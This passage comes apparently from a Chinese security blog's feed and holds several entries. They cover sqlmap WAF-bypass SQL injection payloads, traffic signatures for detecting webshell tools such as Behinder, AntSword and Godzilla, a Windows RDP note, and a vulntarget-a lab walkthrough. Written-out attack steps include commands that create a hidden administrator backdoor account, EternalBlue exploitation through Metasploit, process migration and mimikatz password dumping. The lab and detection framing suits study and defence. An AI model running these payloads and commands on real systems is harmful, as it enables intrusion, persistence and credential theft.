class="hljs-string">&#x27;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#x27;</span>QDWa<span class="hljs-string">&#x27;=&#x27;</span>QDWa<br><br>space2morehash.py<br>适用数据库：MySQL &gt;= <span class="hljs-number">5.1</span><span class="hljs-number">.13</span> 测试通过数据库：MySQL <span class="hljs-number">5.1</span><span class="hljs-number">.41</span> 作用：将空格替换为#，并添加一个随机字符串和换行符 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span>%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=<span class="hljs-number">9227</span><br><br>apostrophenullencode.py<br>适用数据库：ALL 作用：用非法双字节Unicode字符替换单引号 使用脚本前：tamper(<span class="hljs-string">&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;</span>) 使用脚本后：<span class="hljs-number">1</span> AND %00%271%00%27=%00%271<br><br>appendnullbyte.py<br>适用数据库：ALL 作用：在有效载荷的结束位置加载null字节字符编码 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 1=1&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND <span class="hljs-number">1</span>=<span class="hljs-number">1</span>%00<br><br>chardoubleencode.py<br>适用数据库：ALL 作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符） 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD FROM%20TABLE&#x27;</span>) 使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545<br><br>unmagicquotes.py<br>适用数据库：ALL 作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格 使用脚本前：tamper(<span class="hljs-string">&quot;1&#x27; AND 1=1&quot;</span>) 使用脚本后：<span class="hljs-number">1</span>%bf%27 AND <span class="hljs-number">1</span>=<span class="hljs-number">1</span>--<br><br>randomcomments.py<br>适用数据库：ALL 作用：用注释符分割sql关键字 使用脚本前：tamper(<span class="hljs-string">&#x27;INSERT&#x27;</span>) 使用脚本后：I<span class="hljs-comment">/**/</span>N<span class="hljs-comment">/**/</span>SERT<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>冰蝎流量特征</title>
    <link href="/posts/18004abd.html"/>
    <url>/posts/18004abd.html</url>
    
    <content type="html"><![CDATA[<h1>冰蝎流量特征</h1><h2 id="PHP"><a class="header-anchor" href="#PHP">¶</a>PHP</h2><p><strong>先用冰蝎生成服务端</strong>（php马）这里使用aes加密。</p><img src="/posts/18004abd/image-20230808150457200.png" class title="image-20230808150457200"><p>生成一个shell.php文件</p><p>本地打开bp，配置冰蝎的代理为bp监听的ip和端口</p><img src="/posts/18004abd/image-20230808170553506.png" class title="image-20230808170553506"><p>将shell.php放到网站下，用冰蝎连接</p><img src="/posts/18004abd/image-20230808150632022.png" class title="image-20230808150632022"><p>抓取<strong>命令执行</strong>的请求包</p><img src="/posts/18004abd/image-20230808171009592.png" class title="image-20230808171009592"><p>冰蝎使用的AES（对称加密）16位密钥和base64编码</p><h4 id="冰蝎流量特征"><a class="header-anchor" href="#冰蝎流量特征">¶</a><strong>冰蝎流量特征</strong></h4><p>Accept字段：</p><p>请求头中存在：</p><p><strong>Accept: application/json, text/javascript, <em>/</em>; q=0.01</strong></p><img src="/posts/18004abd/image-20230808154526106.png" class title="image-20230808154526106"><p>也有可能*<em>Accept: text/html,image/gif, image/jpeg, <em>; q=.2, <em>/</em>; q=.2</em></em></p><p>**Content-Type: application/octet-stream <strong>q=0.8</strong></p><p><strong>userAgent字段：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">4</span>.<span class="hljs-number">0</span> (compatible; MSIE <span class="hljs-number">6</span>.<span class="hljs-number">0</span>; Windows NT <span class="hljs-number">5</span>.<span class="hljs-number">1</span>; SV1)<br><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows; U; Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; en-US) AppleWebKit/<span class="hljs-number">533</span>+ (KHTML, like Gecko) Element Browser/<span class="hljs-number">5</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">4</span>.<span class="hljs-number">0</span> (compatible; MSIE <span class="hljs-number">8</span>.<span class="hljs-number">0</span>; Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; Trident/<span class="hljs-number">4</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">58</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3029</span>.<span class="hljs-number">110</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">37</span> Edge/<span class="hljs-number">16</span>.<span class="hljs-number">16299</span><br><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; WOW64; rv:<span class="hljs-number">45</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">45</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; WOW64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">47</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2526</span>.<span class="hljs-number">106</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (compatible; MSIE <span class="hljs-number">9</span>.<span class="hljs-number">0</span>; Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; Trident/<span class="hljs-number">5</span>.<span class="hljs-number">0</span>)Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; WOW64; Trident/<span class="hljs-number">7</span>.<span class="hljs-number">0</span>; AS; rv:<span class="hljs-number">11</span>.<span class="hljs-number">0</span>) like Gecko<br><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; WOW64; rv:<span class="hljs-number">39</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">39</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">5</span>.<span class="hljs-number">1</span>; rv:<span class="hljs-number">40</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">40</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">69</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3497</span>.<span class="hljs-number">100</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; Trident/<span class="hljs-number">7</span>.<span class="hljs-number">0</span>; rv:<span class="hljs-number">11</span>.<span class="hljs-number">0</span>) like GeckoMozilla/<span class="hljs-number">7</span>.<span class="hljs-number">0</span> (compatible; MSIE <span class="hljs-number">9</span>.<span class="hljs-number">0</span>; Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; Trident/<span class="hljs-number">5</span>.<span class="hljs-number">0</span>; Xbox)<br></code></pre></td></tr></table></figure><p>Connection子段：</p><p><strong>Connection: Keep-Alive</strong>（这里是另一个shell）<em>是冰蝎默认使用的长连接特征</em></p><p>请求正文不能直接看出流量特征，因为冰蝎已经对生成的马子进行了加密</p><p>可以通过解码来看请求正文</p><img src="/posts/18004abd/image-20230808154646023.png" class title="image-20230808154646023"><img src="/posts/18004abd/image-20230808155430888.png" class title="image-20230808155430888"><img src="/posts/18004abd/image-20230808155504785.png" class title="image-20230808155504785"><p>对响应正文进行aes解码</p><img src="/posts/18004abd/image-20230808162049181.png" class title="image-20230808162049181"><img src="/posts/18004abd/image-20230808162142819.png" class title="image-20230808162142819"><img src="/posts/18004abd/image-20230808162032036.png" class title="image-20230808162032036"><img src="/posts/18004abd/image-20230808162019105.png" class title="image-20230808162019105"><p>解码以后是whoami的执行结果</p><img src="/posts/18004abd/image-20230808162245848.png" class title="image-20230808162245848"><h2 id="JSP"><a class="header-anchor" href="#JSP">¶</a>JSP</h2><p>jsp的流量特征以及响应包都和PHP相同，不同的地方在于请求正文的解析。</p><p>jsp的请求正文需要利用程序生成.class文件，再利用JAVA逆向的工具将.class文件解析成java源码。</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>运维</tag>
      
      <tag>木马特征</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>菜蚁哥蝎流量特征</title>
    <link href="/posts/b3a9e5e0.html"/>
    <url>/posts/b3a9e5e0.html</url>
    
    <content type="html"><![CDATA[<h1>菜刀</h1><p>特征：</p><p>base64加密</p><p>请求头中</p><p>User-Agent存在百度或者火狐</p><p>请求体中</p><p>会存在QGluaV9zZXQ攻击的开头部分后面的部分需要base64解码</p><p>z0(也会修改)跟随后面的payload的base64的数据。z0是菜刀的默认参数</p><p>eval也会替换成assert的方式（可能是拼接）</p><p>（“ass”.“ert”,…</p><p>固定的字段：</p><p><strong>QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</strong></p><p>eval不是菜刀就是蚁剑，但是后面跟着z0就可以判断为菜刀，并且后面跟着base64的特征</p><h2 id="蚁剑"><a class="header-anchor" href="#蚁剑">¶</a>蚁剑</h2><h4 id="特征："><a class="header-anchor" href="#特征：">¶</a><strong>特征</strong>：</h4><p>请求中的User-Agent值是：antSword/*</p><p>也有可能是：</p><p>Mozilla/5.0 (Windows NT *** <em><em>)  AppleWebKit/**</em> (KHTML, like Gecko) Chrome/**<em>*</em> Safari/</em>***</p><p>请求中可以检测到的关键字：“eval””eVAL”</p><p>请求体存在@ini_set(“display_errors”, “0”);@set_time_limit(0);（开头可能是菜刀或者是蚁剑）</p><p>加密后的明显参数多数是_0x…=这种形式所以_0x开头的参数名，以及dirname、get_current_user函数的字眼（需要讲请求内容解密后判断），后面为加密数据的数据包可以鉴定为蚁剑的流量特征</p><p>在命令执行时有目录标记[S]、[E]、[R]、[D]、等，说明已经拿到shell了（在执行系统命令）</p><p>payload特征</p><p>php assert、eval关键字执行,</p><p>asp eval在jsp使用</p><p>Java 同时会带有base64编码解码等字符特征</p><h1>冰蝎</h1><p>请移步访问我的另一篇文档“冰蝎流量特征”</p><h1>哥斯拉流量特征</h1><p><strong>1.User-Agent (弱特征)</strong></p><p>哥斯拉客户端使用JAVA语言编写，在默认的情况下，如果不修改User-Agent，User-Agent会类似于Java/1.8.0_121（具体什么版本取决于JDK环境版本）。但是哥斯拉支持自定义HTTP头部，这个默认特征是可以很容易去除的。</p><p><strong>2.Accept（弱特征）</strong></p><p>Accept为text/html, image/gif, image/jpeg, *; q=.2, <em>/</em>; q=.2</p><p>(Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8  )</p><p>相应头中的Cache-Control头是</p><p>Cache-Control: no-store, no-cache, must-revalidate</p><p>对这个默认特征应该很熟悉了，之前冰蝎也出现过同样的Accept。为什么会这么巧合出现两个工具都会出现这个特征呢，其实这个也是JDK引入的一个特征，并不是作者自定义的Accept（参考：<a href="https://bugs.openjdk.java.net/browse/JDK-8177439%EF%BC%89%E3%80%82%E5%90%8C%E6%A0%B7%E7%9A%84%E8%BF%99%E4%B8%AA%E9%BB%98%E8%AE%A4%E7%89%B9%E5%BE%81%E4%B9%9F%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%87%AA%E5%AE%9A%E4%B9%89%E5%A4%B4%E9%83%A8%E5%8E%BB%E9%99%A4%EF%BC%8C%E5%8F%AA%E8%83%BD%E4%BD%9C%E4%B8%BA%E9%BB%98%E8%AE%A4%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%A3%80%E6%B5%8B%E7%89%B9%E5%BE%81%E3%80%82">https://bugs.openjdk.java.net/browse/JDK-8177439）。同样的这个默认特征也可以通过自定义头部去除，只能作为默认情况下的辅助检测特征。</a></p><p><strong>3.Cookie (强特征)</strong></p><p>哥斯拉的作者应该还没有意识到，在请求包的Cookie中有一个非常致命的特征，最后的分号。标准的HTTP请求中最后一个Cookie的值是不应该出现;的，这个可以作为现阶段的一个辅助识别特征。</p><p><strong>4.请求体（强特征）</strong></p><p>二次解码后可以看到webshell木马的密码</p><p>dir命令数据包可以明显看到哥斯拉的流量特征</p><p>在请求体中出现2次url和base编码特征</p><p>%27%253D%25</p><p>是哥斯拉2次url编码后的==</p><p>是哥斯拉倒序的base64的特征</p><h2 id="php"><a class="header-anchor" href="#php">¶</a>php</h2><h3 id="实操："><a class="header-anchor" href="#实操：">¶</a>实操：</h3><h4 id="1、-生成哥斯拉不同加密器的木马文件放入网站根目录，查看IP，进行访问"><a class="header-anchor" href="#1、-生成哥斯拉不同加密器的木马文件放入网站根目录，查看IP，进行访问">¶</a><strong>1、</strong> 生成哥斯拉不同加密器的木马文件放入网站根目录，查看IP，进行访问</h4><p><img src="/posts/b3a9e5e0/wps1.jpg" alt="img"><img src="/posts/b3a9e5e0/wps2.jpg" alt="img"><img src="/posts/b3a9e5e0/wps3.jpg" alt="img"></p><h4 id="2、设置burpsuite代理，开启抓包-哥斯拉进行目标添加"><a class="header-anchor" href="#2、设置burpsuite代理，开启抓包-哥斯拉进行目标添加">¶</a>2、设置burpsuite代理，开启抓包,哥斯拉进行目标添加</h4><p><img src="/posts/b3a9e5e0/wps4.jpg" alt="img"><img src="/posts/b3a9e5e0/wps5.jpg" alt="img"><img src="/posts/b3a9e5e0/wps6.jpg" alt="img"></p><h4 id="4、查看bp数据包特征"><a class="header-anchor" href="#4、查看bp数据包特征">¶</a>4、查看bp数据包特征</h4><p>1、所有请求中<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8<br>2、所有响应中<br>Cache-Control: no-store, no-cache, must-revalidate,<br>3、在所有请求中Cookie中后面都存在；特征</p><h5 id="a-php"><a class="header-anchor" href="#a-php">¶</a>a.php</h5><p><img src="/posts/b3a9e5e0/wps7.jpg" alt="img"><img src="/posts/b3a9e5e0/wps8.jpg" alt="img"></p><h5 id="b-php"><a class="header-anchor" href="#b-php">¶</a>b.php</h5><p><img src="/posts/b3a9e5e0/wps9.jpg" alt="img"><img src="/posts/b3a9e5e0/wps10.jpg" alt="img"></p><h5 id="c-php"><a class="header-anchor" href="#c-php">¶</a>c.php</h5><p><img src="/posts/b3a9e5e0/wps11.jpg" alt="img"><img src="/posts/b3a9e5e0/wps12.jpg" alt="img"></p><h2 id="java"><a class="header-anchor" href="#java">¶</a>java</h2><h3 id="加密方式1"><a class="header-anchor" href="#加密方式1">¶</a>加密方式1</h3><p>使用JAVA_AES_BASE64加密方式生成木马文件，使用tomcat或宝塔面板对木马文件进行访问</p><img src="/posts/b3a9e5e0/wps13.jpg" class title="img"> <p>使用哥斯拉进行连接测试并开启bp抓包，进行查看，放包查看响应包</p><img src="/posts/b3a9e5e0/wps14.jpg" class title="img"> <h3 id="加密方式2"><a class="header-anchor" href="#加密方式2">¶</a>加密方式2</h3><p>使用JAVA_AES_RAW加密方式生成木马，使用tomcat/宝塔面板进行访问</p><h4 id="swig￼2"><a class="header-anchor" href="#swig￼2">¶</a><img src="/posts/b3a9e5e0/wps15.jpg" class title="img"></h4><p>进行抓包</p><img src="/posts/b3a9e5e0/wps16.jpg" class title="img"> <h3 id="bp数据包特征"><a class="header-anchor" href="#bp数据包特征">¶</a>bp数据包特征</h3><p>User-Agent字段，默认<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</p><p>Accept字段，默认<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q</p><p>Set-Cookie中，最后有分号</p><p>协议头默认情况下不变，但是可对协议头进行修改</p><img src="/posts/b3a9e5e0/wps17.jpg" class title="img"> ]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows远程连接问题解决</title>
    <link href="/posts/391aa8cd.html"/>
    <url>/posts/391aa8cd.html</url>
    
    <content type="html"><![CDATA[<h1>windows远程连接问题</h1><img src="/posts/391aa8cd/1669272126356-02a27684-12fa-4298-90bb-27abb97222e2.png" class title="img"><img src="/posts/391aa8cd/1669272134973-b87e8c6f-69f7-4a87-86f5-f69a3032bc4b.png" class title="img"><h1>3389连接问题</h1><p>1.使用以下命令判断3389端口是否是处于开放的状态；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">netstat -an<br>netstat -an | findstr 3389<br></code></pre></td></tr></table></figure><p>2.如果以上的命令没有发现3389端口开放，使用以下查看注册表命令查询RDP服务占用的端口；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber<br></code></pre></td></tr></table></figure><p>3.如果得到的值为0xd3d说明RDP服务是没有开启需要执行以下命令开启RDP服务并进行检测…</p><p>查询系统是否允许3389远程连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections<br>1表示关闭，0表示开启<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">3389开启指令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br></code></pre></td></tr></table></figure><p>关闭指令将00000000改为11111111</p><p>创建隐藏账户</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">net user 12k$ 1798hacker@ /add<br>net localgroup administrators 12k$ /add<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>权限维持</category>
      
    </categories>
    
    
    <tags>
      
      <tag>权限维持</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulntarget-a打靶</title>
    <link href="/posts/d6f0653f.html"/>
    <url>/posts/d6f0653f.html</url>
    
    <content type="html"><![CDATA[<h1>vulntarget-a靶场复现</h1><p><img src="/posts/d6f0653f/1657868834428-f628c01b-5b68-4a07-b27c-e5cc8e16b5e7-1687676865522-1.png" alt="img"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta">#攻击机</span><br><span class="hljs-symbol">OS:</span>Kali <span class="hljs-number">2022</span><br>外NIC:<span class="hljs-number">192.168</span>.x.x   (桥接模式)(与Win7-PC主机进行通信)<br><br><br><span class="hljs-meta">#Web Server</span><br><span class="hljs-symbol">OS:</span>Windows <span class="hljs-number">7</span><br><span class="hljs-symbol">Hostname:</span>Win7-PC<br><span class="hljs-symbol">Server:</span>通达OA <span class="hljs-number">11.3</span><br><span class="hljs-symbol">username:</span>win7<br><span class="hljs-symbol">password:</span>admin<br>外NIC:<span class="hljs-number">192.168</span>.x.x     (NAT模式)(与Kali通信)<br>内NIC:<span class="hljs-number">10.0</span><span class="hljs-number">.20</span><span class="hljs-number">.98</span>   (仅主机模式)(与Win2016主机即可域成员进行通信)(能够<span class="hljs-built_in">Ping</span>通Win2016主机)<br><br><br><span class="hljs-meta">#域成员</span><br><span class="hljs-symbol">OS:</span>Windows Server <span class="hljs-number">2016</span><br><span class="hljs-symbol">Hostname:</span>win2016<br><span class="hljs-symbol">Server:</span>PHPStudy+Redis<br><span class="hljs-symbol">username:</span>vulntarget\win2016<br><span class="hljs-symbol">password:</span>Admin<span class="hljs-meta">#123</span><br>内NIC：<span class="hljs-number">10.0</span><span class="hljs-number">.20</span><span class="hljs-number">.99</span>     (仅主机模式)(与Win7即WEB主机进行通信)(能够<span class="hljs-built_in">Ping</span>通Win7-PC主机)<br>内NIC：<span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.111</span>    (仅主机模式)(与Win2019即域控通信)(能够<span class="hljs-built_in">Ping</span>通Win2019主机)<br><br><br><span class="hljs-meta">#域控</span><br><span class="hljs-symbol">OS:</span>Windows Server <span class="hljs-number">2019</span><br><span class="hljs-symbol">Hostname:</span>win2019<br><span class="hljs-symbol">Server:</span>AD DC<br><span class="hljs-symbol">username:</span>vulntarget\administrator<br><span class="hljs-symbol">password:</span>Admin<span class="hljs-subst">@666</span><br>内网NIC：<span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.110</span>    (仅主机模式)(与Win2016即域内成员通信)(能够<span class="hljs-built_in">Ping</span>通Win2016主机)<br></code></pre></td></tr></table></figure><h2 id="一、边界主机"><a class="header-anchor" href="#一、边界主机">¶</a>一、边界主机</h2><h3 id="Web端攻击"><a class="header-anchor" href="#Web端攻击">¶</a>Web端攻击</h3><ol><li>拿到边界主机IP，先对其进行访问。按F12发现是通达OA的办公系统。</li></ol><p><img src="/posts/d6f0653f/image-20230622111403820-1687676304662-3.png" alt="image-20230622111403820"></p><ol start="2"><li><p>利用通达OA的办公利用工具进行漏洞利用。获取到webshell。</p></li><li><p><img src="/posts/d6f0653f/image-20230622111841963.png" alt="image-20230622111841963"></p></li><li><p>利用蚁剑进行连接。成功上线。</p></li></ol><p><img src="/posts/d6f0653f/image-20230622112151646.png" alt="image-20230622112151646"></p><h3 id="系统层面攻击"><a class="header-anchor" href="#系统层面攻击">¶</a>系统层面攻击</h3><ol><li><p>用nmap扫描发现主机开放135和445端口，系统版本为win7sp1版本，尝试利用永恒之蓝漏洞进行攻击。</p></li><li><p>在kali中开启MSF并调用相应模块。先搜索永恒之蓝的编号：ms17_010(正常情况下要先使用模块3进行探测是否存在永恒之蓝，由于这里是打靶，直接使用模块0，对永恒之蓝进行利用)</p></li></ol><p><img src="/posts/d6f0653f/image-20230622113555676-1687676266846-1.png" alt="image-20230622113555676"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">use 0<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.172.132<br>RHOSTS =&gt; 192.168.172.132<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run<br></code></pre></td></tr></table></figure><ol start="3"><li>出现 <code>meterpreter &gt; </code>上线MSF成功。</li></ol><h3 id="拿到远程桌面"><a class="header-anchor" href="#拿到远程桌面">¶</a>拿到远程桌面</h3><ol><li><p>输入<code>netstat -an | findstr 3389</code>发现边界主机并没</p><p>有开启3389端口，在MSF中执行<code>run post/windows/manage/enable_rdp </code>开启3389</p></li><li><p>在蚁剑中创建后门账户。（知识点：创建影子后门账户）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user 用户名 密码 /add<br>net localgroup administrators 用户名 /add<br></code></pre></td></tr></table></figure></li><li><p>使用windows中的<code>mstsc</code>或者kali中的<code>rdesktop</code>进行远程桌面连接。（如果实战中遇到下面这种情况，一定一定一定不要点是！！！）</p></li></ol><p><img src="/posts/d6f0653f/image-20230622115253943.png" alt="image-20230622115253943"></p><h2 id="二、内网域成员主机"><a class="header-anchor" href="#二、内网域成员主机">¶</a>二、内网域成员主机</h2><p>拿下边界主机以后在MSF中输入shell，进入该主机的命令执行端，直接执行命令会出现乱码，执行以下命令修改编码并开始收集信息…</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chcp</span> <span class="hljs-number">65001</span>（<span class="hljs-number">65001</span> UTF-<span class="hljs-number">8</span>代码页）<br><span class="hljs-attribute">whoami</span><br><span class="hljs-attribute">ipconfig</span> /<span class="hljs-literal">all</span><br><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure><p>输入<code>ipconfig</code>发现当前主机有两个网段的网卡(一个公网网卡一个内网网卡)：</p><p><img src="/posts/d6f0653f/image-20230622120842167.png" alt="image-20230622120842167"></p><p>上传fscan，利用fscan对其内网环境进行扫描（记得关闭防火墙）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fcan64</span>.exe -h <span class="hljs-number">10.0.20.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="/posts/d6f0653f/image-20230622160409266.png" alt="image-20230622160409266"></p><p>但是并没有探测出其他主机…</p><p>在MSF中进行内网探测/信息收集/迁移进程/抓取明文密码/关闭防火墙…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">shell</span><br>chcp 65001   #设置为UTF-8代码页<br>net user     #查看用户<br>hostname     #查看主机名<br>ipconfig     #查看网卡信息<br>systeminfo   #查看信息信息<br>arp -a       #查看内网通信主机<br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">ps   <span class="hljs-comment">#查看进程信息</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">getpid <span class="hljs-comment">#查看当前木马的进程信息</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">migrate 进程PID <span class="hljs-comment">#将当前进程注入到其他进程中 选择64位的(隐藏木马程序)</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">load kiwi    <span class="hljs-comment"># 加载mimikazt/Shell必须64位才能加载运行KIWI模块</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">kiwi_cmd sekurlsa::logonpasswords   <span class="hljs-comment">#执行mimiakatz的命令/抓取明文密码</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">netsh advfirewall show allprofile state   <span 